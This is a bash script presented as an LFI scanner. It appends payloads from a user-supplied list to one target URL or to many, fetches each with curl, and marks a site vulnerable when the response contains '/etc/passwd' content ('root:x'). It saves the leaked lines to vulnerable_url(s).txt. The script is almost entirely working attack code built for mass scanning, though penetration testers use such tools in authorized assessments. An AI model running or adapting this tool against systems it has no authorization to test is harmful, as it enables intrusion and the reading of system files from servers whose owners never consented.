#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'

function banner(){
echo -e ${RED}"##############################################################################"
echo -e ${CP}"    _     _____ ___     ____   ____    _    _   _ _   _ _____ ____            #"             
echo -e ${CP}"   | |   |  ___|_ _|   / ___| / ___|  / \  | \ | | \ | | ____|    \           #"                                 
echo -e ${CP}"   | |   | |_   | |    \___ \| |     / _ \ |  \| |  \| |  _| | |_) |          #"
echo -e ${CP}"   | |___|  _|  | |     ___) | |___ / ___ \| |\  | |\  | |___|  _ <           #"     
echo -e ${CP}"   |_____|_|   |___|___|____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\          #"        
echo -e  ${CP}"                  |_____|                                                     #"
echo -e ${BLUE}"                 A FrameWork For Scanning Local File Inclusion                #"
echo -e ${YELLOW}"                       Coded By: Machine404                                   #"
echo -e ${CPO}"                   https://github.com/machine1337                             #"  
echo -e ${CNC}"                   https://facebook.com/unknownclay                           #"
echo -e ${RED}"###############################################################################"
}
sleep 1
echo -e ${CP}"[+] Checking Internet Connectivity"
if [[ "$(ping -c 1 8.8.8.8 | grep '100% packet loss' )" != "" ]]; then
  echo "No Internet Connection"
  exit 1
  else
  echo "Internet is present"
  
fi
function single_scan(){
clear
banner
echo -e -n ${BLUE}"\n[+] Enter domain name (e.g https://target.com/) : "
read domain
echo -e -n ${BLUE}"\n[+] Enter path of payloads list:  "
read list
sleep 1
echo -e ${CNC}"\n[+] Searching For LFI: "
for i in $(cat $list); do
file=$(curl -s -m5  $domain$i)
echo -n -e ${YELLOW}"\nURL: $domain" >> output.txt
echo "$file" >> output.txt
if grep root:x   <<<"$file" >/dev/null 2>&1
  then
  echo -n -e ${RED}"\nURL: $domain ${CP}"[Payload $i]" ${RED}[Vulnerable]\n"
  cat output.txt | grep   -e  URL -e root:x  >> vulnerable_url.txt
  cat output.txt | sed '3,18p;d' >> vulnerable_url.txt
  rm output.txt
  else
  echo -n -e ${GREEN}"\nURL: $domain  [Not Vulnerable]\n"
   rm output.txt
 fi
 done
}
function mass_scan(){

clear
banner
echo -n -e ${PINK}"\n[+]Enter target urls list (e.g https://target.com) : "
read urls
echo -n -e ${PINK}"\n[+]Enter path of payloads list : "
read pay
sleep 1
echo -e ${CNC}"\n[+] Searching For LFI: "

for i in $(cat $urls ); do
for j in $(cat $pay); do
     file=$(curl  -s -m5  $i$j)  
     
    echo -n -e ${YELLOW}"URL: $i" >> output.txt
    echo "$file" >> output.txt
    
    if grep root:x  <<<"$file"   >/dev/null 2>&1
  then
  
  echo  -e ${RED}"\n[*] URL: $i ${CP}"[Payload $j]"${RED}[Vulnerable]\n"
  cat output.txt | grep -e URL   >> vulnerable_urls.txt
  cat output.txt | sed '3,18p;d' >> vulnerable_urls.txt
  rm output.txt
  else
  echo -n -e ${GREEN}"\nURL: $i  [Not Vulnerable]"
   rm output.txt
 
fi
done
done
}

menu()
{
clear
banner
echo -e ${YELLOW}"\n[*] Which Type of Scan u want to Perform\n "
echo -e "  ${NC}[${CG}"1"${NC}]${CNC} Single Url "
echo -e "  ${NC}[${CG}"2"${NC}]${CNC} List of Urls "
echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Exit"

echo -n -e ${YELLOW}"\n[+] Select: "
        read lfi_play
                if [ $lfi_play -eq 1 ]; then
                        single_scan
                elif [ $lfi_play -eq 2 ]; then
                        mass_scan
                elif [ $lfi_play -eq 3 ]; then
                      exit
                fi
}
menu
